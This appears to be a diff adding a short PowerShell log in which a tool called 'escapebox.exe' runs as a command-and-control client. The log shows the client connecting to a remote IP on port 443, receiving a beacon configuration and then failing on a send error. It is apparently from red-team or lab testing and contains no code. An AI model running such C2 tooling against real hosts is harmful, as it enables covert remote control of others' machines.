@@ -1,0 +1,13 @@
+PS C:\Users\Administrator\Desktop> .\escapebox.exe client 35.175.236.219
+
+[====== ESCAPEBOX C2 CLIENT ======]
+[INFO] Starting Unified C2 Client...
+[INFO] Target server: 35.175.236.219:443
+[INFO] Attempting to connect...
+[SUCCESS] Connected to server!
+[INFO] Client ID: 35.175.236.219:443_8842796
+[INFO] Client is running... (Press Ctrl+C to exit)
+[RECEIVED] BEACON|TYPE:HTTP|INTERVAL:60|JITTER:10|SERVER:172.31.36.70:443|PROTOCOL:TLS1.2|USER-AGENT:Mozilla/5....
+[ERROR] Send failed: 10054
+[INFO] Client shutting down...
+PS C:\Users\Administrator\Desktop>
